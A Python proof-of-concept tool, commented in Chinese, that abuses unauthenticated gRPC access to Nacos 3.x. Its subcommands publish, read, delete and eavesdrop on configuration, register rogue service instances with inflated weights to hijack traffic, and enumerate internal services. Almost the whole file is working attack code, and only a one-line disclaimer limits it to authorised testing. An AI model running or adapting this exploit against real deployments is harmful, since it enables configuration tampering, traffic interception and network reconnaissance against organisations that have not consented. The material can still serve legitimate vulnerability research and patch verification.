#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nacos 3.x gRPC 零凭据原语工具集（F-01 PoC）
依赖: pip install grpcio protobuf
stub: python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. nacos_grpc.proto

子命令 = 原语:
  config-publish   发布/篡改配置
  config-query     查询配置（自动重试，绕异步缓存延迟）
  config-remove    删除配置
  config-listen    订阅配置变更窃听（服务端主动推送）
  instance-register 注册实例进业务服务（流量劫持；--weight 抢流量）
  instance-batch    批量注册实例
  instance-remove   注销实例
  service-list      枚举服务实例（内网测绘）
  service-watch     订阅服务变更（实例上下线推送）

全程零凭据。仅用于授权测试。
"""
import argparse
import hashlib
import json
import queue
import sys
import threading
import time

import grpc
from google.protobuf.any_pb2 import Any

import nacos_grpc_pb2 as pb
import nacos_grpc_pb2_grpc as pb_grpc


# ---------------- 公共：连接与握手 ----------------

def payload(req_type, obj):
    body = Any(value=json.dumps(obj).encode("utf-8"))
    return pb.Payload(metadata=pb.Metadata(type=req_type, clientIp="127.0.0.1"), body=body)


def parse(resp):
    body = {}
    if resp.body.value:
        try:
            body = json.loads(resp.body.value.decode("utf-8"))
        except Exception:
            body = {"raw": resp.body.value[:200].decode("utf-8", "replace")}
    return {"type": resp.metadata.type, "body": body}


class Client:
    def __init__(self, server, module):
        """module: 'config' 或 'naming'（naming 必须带 module 标签才建 Client）"""
        self.channel = grpc.insecure_channel(server, options=[("grpc.enable_retries", 0)])
        self.stub = pb_grpc.RequestStub(self.channel)
        self.push_q = queue.Queue()
        bi = pb_grpc.BiRequestStreamStub(self.channel)
        self.send_q = queue.Queue()

        def gen():
            while True:
                item = self.send_q.get()
                if item is None:
                    return
                yield item

        stream = bi.requestBiStream(gen())

        def reader():
            try:
                for msg in stream:
                    self.push_q.put(parse(msg))
            except grpc.RpcError:
                pass

        threading.Thread(target=reader, daemon=True).start()
        labels = {"source": "sdk"}
        if module:
            labels["module"] = module
        self.send_q.put(payload("ConnectionSetupRequest", {
            "requestId": "1", "clientVersion": "3.2.4-Python-PoC", "tenant": "",
            "labels": labels, "abilityTable": {"supportRemoteConfiguration": True},
        }))
        time.sleep(1)

    def call(self, req_type, obj, timeout=5):
        return parse(self.stub.request(payload(req_type, obj), timeout=timeout))

    def wait_push(self, seconds):
        """等待并打印服务端推送（ConfigChangeNotifyRequest / NotifySubscriberRequest 等）"""
        end = time.time() + seconds
        got = 0
        while time.time() < end:
            try:
                msg = self.push_q.get(timeout=max(0.1, end - time.time()))
            except queue.Empty:
                break
            got += 1
            b = msg["body"]
            if msg["type"] == "ConfigChangeNotifyRequest":
                print("[push] ConfigChangeNotify: dataId=%s group=%s tenant=%s"
                      % (b.get("dataId"), b.get("group"), b.get("tenant")))
            elif msg["type"] == "NotifySubscriberRequest":
                si = b.get("serviceInfo") or {}
                hosts = si.get("hosts") or []
                print("[push] ServiceChanged: %s instances=%d" % (si.get("name"), len(hosts)))
                for h in hosts:
                    print("    %s:%s w=%s" % (h.get("ip"), h.get("port"), h.get("weight")))
            else:
                print("[push]", msg["type"], json.dumps(b, ensure_ascii=False)[:160])
        return got

    def close(self):
        try:
            self.channel.close()
        except Exception:
            pass


# ---------------- 各原语实现 ----------------

def cmd_config_publish(a):
    c = Client(a.server, None)
    r = c.call("ConfigPublishRequest", {
        "requestId": "p", "dataId": a.data_id, "group": a.group, "tenant": a.tenant,
        "content": a.content, "additionMap": {"type": a.type},
    })
    print("[publish] <- %s resultCode=%s success=%s"
          % (r["type"], r["body"].get("resultCode"), r["body"].get("success")))
    c.close()


def cmd_config_query(a):
    c = Client(a.server, None)
    for i in range(10):
        r = c.call("ConfigQueryRequest", {
            "requestId": "q", "dataId": a.data_id, "group": a.group, "tenant": a.tenant,
        })
        if r["body"].get("content") is not None:
            print("[query] <- content=%r md5=%s type=%s (retry=%d)"
                  % (r["body"]["content"], r["body"].get("md5"), r["body"].get("configType"), i))
            c.close()
            return
        time.sleep(1)
    print("[query] <- 未取到，最后响应：", json.dumps(r, ensure_ascii=False))
    c.close()
    sys.exit(1)


def cmd_config_remove(a):
    c = Client(a.server, None)
    r = c.call("ConfigRemoveRequest", {
        "requestId": "d", "dataId": a.data_id, "group": a.group, "tenant": a.tenant,
    })
    print("[remove] <- %s resultCode=%s" % (r["type"], r["body"].get("resultCode")))
    c.close()


def cmd_config_listen(a):
    c = Client(a.server, None)
    # md5 故意传空：与当前内容必然不一致 → 服务端立即推送一次；后续每次变更再推送
    ctx = {"group": a.group, "md5": "", "dataId": a.data_id, "tenant": a.tenant}
    r = c.call("ConfigBatchListenRequest", {
        "requestId": "l", "listen": True, "configListenContexts": [ctx],
    })
    print("[listen] <- %s resultCode=%s （%ds 内的推送如下，Ctrl-C 提前结束）"
          % (r["type"], r["body"].get("resultCode"), a.duration))
    c.wait_push(a.duration)
    c.close()


def mk_instance(ip, port, weight, service, cluster):
    return {"ip": ip, "port": port, "weight": weight, "healthy": True, "enabled": True,
            "ephemeral": True, "clusterName": cluster, "serviceName": service,
            "metadata": {"preserved.register.source": "python-poc"}}


def cmd_instance_register(a):
    c = Client(a.server, "naming")
    r = c.call("InstanceRequest", {
        "requestId": "r", "namespace": a.namespace, "serviceName": a.service,
        "groupName": a.group, "type": "registerInstance",
        "instance": mk_instance(a.ip, a.port, a.weight, a.service, a.cluster),
    })
    print("[register] <- %s resultCode=%s weight=%s （连接需保持，断开约30s后实例自动摘除）"
          % (r["type"], r["body"].get("resultCode"), a.weight))
    if a.hold:
        print("[hold] 保持连接 %ds ..." % a.duration)
        time.sleep(a.duration)
    c.close()


def cmd_instance_batch(a):
    c = Client(a.server, "naming")
    instances = [mk_instance(a.ip, a.port + i, a.weight, a.service, a.cluster)
                 for i in range(a.count)]
    r = c.call("BatchInstanceRequest", {
        "requestId": "b", "namespace": a.namespace, "serviceName": a.service,
        "groupName": a.group, "type": "batchRegisterInstance", "instances": instances,
    })
    print("[batch] <- %s resultCode=%s count=%d base=%s:%d"
          % (r["type"], r["body"].get("resultCode"), a.count, a.ip, a.port))
    if a.hold:
        print("[hold] 保持连接 %ds ..." % a.duration)
        time.sleep(a.duration)
    c.close()


def cmd_instance_remove(a):
    c = Client(a.server, "naming")
    r = c.call("InstanceRequest", {
        "requestId": "d", "namespace": a.namespace, "serviceName": a.service,
        "groupName": a.group, "type": "deregisterInstance",
        "instance": mk_instance(a.ip, a.port, 1.0, a.service, a.cluster),
    })
    print("[deregister] <- %s resultCode=%s" % (r["type"], r["body"].get("resultCode")))
    c.close()


def cmd_service_list(a):
    c = Client(a.server, "naming")
    r = c.call("ServiceQueryRequest", {
        "requestId": "q", "namespace": a.namespace, "serviceName": a.service,
        "groupName": a.group, "cluster": a.cluster, "healthyOnly": False, "udpPort": 0,
    })
    hosts = (r["body"].get("serviceInfo") or {}).get("hosts") or []
    print("[list] <- %s instances=%d" % (r["type"], len(hosts)))
    for h in hosts:
        print("    %s:%s w=%s healthy=%s meta=%s"
              % (h.get("ip"), h.get("port"), h.get("weight"), h.get("healthy"), h.get("metadata")))
    c.close()


def cmd_service_watch(a):
    c = Client(a.server, "naming")
    r = c.call("SubscribeServiceRequest", {
        "requestId": "s", "namespace": a.namespace, "serviceName": a.service,
        "groupName": a.group, "clusters": "", "subscribe": True,
    })
    print("[watch] <- %s resultCode=%s （%ds 内实例上下线推送如下）"
          % (r["type"], r["body"].get("resultCode"), a.duration))
    c.wait_push(a.duration)
    c.close()


# ---------------- CLI ----------------

def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("cmd", choices=["config-publish", "config-query", "config-remove",
                                    "config-listen", "instance-register", "instance-batch",
                                    "instance-remove", "service-list", "service-watch"])
    ap.add_argument("--server", default="127.0.0.1:9848")
    ap.add_argument("--data-id", default="f01-python-poc.yml")
    ap.add_argument("--group", default="DEFAULT_GROUP")
    ap.add_argument("--tenant", default="")
    ap.add_argument("--namespace", default="public")
    ap.add_argument("--service", default="user-service")
    ap.add_argument("--ip", default="203.0.113.66")
    ap.add_argument("--port", type=int, default=8081)
    ap.add_argument("--cluster", default="DEFAULT")
    ap.add_argument("--weight", type=float, default=1.0)
    ap.add_argument("--count", type=int, default=3)
    ap.add_argument("--content", default="written by python grpc client, zero credentials")
    ap.add_argument("--type", default="yaml")
    ap.add_argument("--duration", type=int, default=30)
    ap.add_argument("--hold", action="store_true", help="注册后保持连接（ephemeral 实例存活）")
    a = ap.parse_args()

    {"config-publish": cmd_config_publish, "config-query": cmd_config_query,
     "config-remove": cmd_config_remove, "config-listen": cmd_config_listen,
     "instance-register": cmd_instance_register, "instance-batch": cmd_instance_batch,
     "instance-remove": cmd_instance_remove, "service-list": cmd_service_list,
     "service-watch": cmd_service_watch}[a.cmd](a)


if __name__ == "__main__":
    main()
